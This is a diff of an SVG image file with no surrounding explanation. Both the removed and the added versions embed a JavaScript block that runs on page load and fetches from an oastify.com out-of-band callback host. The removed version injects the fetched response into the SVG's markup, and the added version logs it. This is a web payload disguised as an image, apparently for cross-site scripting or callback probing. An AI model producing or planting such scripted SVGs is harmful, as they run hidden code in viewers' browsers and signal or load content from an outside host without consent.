@@ -1,1 +1,21 @@
-<svg xmlns="http://www.w3.org/2000/svg"><script type="text/javascript">document.addEventListener("DOMContentLoaded",function(){fetch("https://aao2vbptnqvexr3hpl1lnfg71y7rvg.oastify.com").then(function(e){return e.text()}).then(function(e){document.querySelector("svg").innerHTML=e}).catch(function(e){console.log("Error: "+e)})})</script></svg>
+<svg xmlns="http://www.w3.org/2000/svg" width="400" height="300">
+  <script type="text/javascript">
+    <![CDATA[
+    document.addEventListener("DOMContentLoaded", function() {
+      fetch("https://1rttc26k4hc5eik86cic46xyipokc9.oastify.com")
+        .then(function(response) {
+          return response.text();
+        })
+        .then(function(data) {
+          console.log(data);
+          // Handle the response data here
+        })
+        .catch(function(error) {
+          console.log("Error: " + error);
+        });
+    });
+    ]]>
+  </script>
+  
+</svg>
+
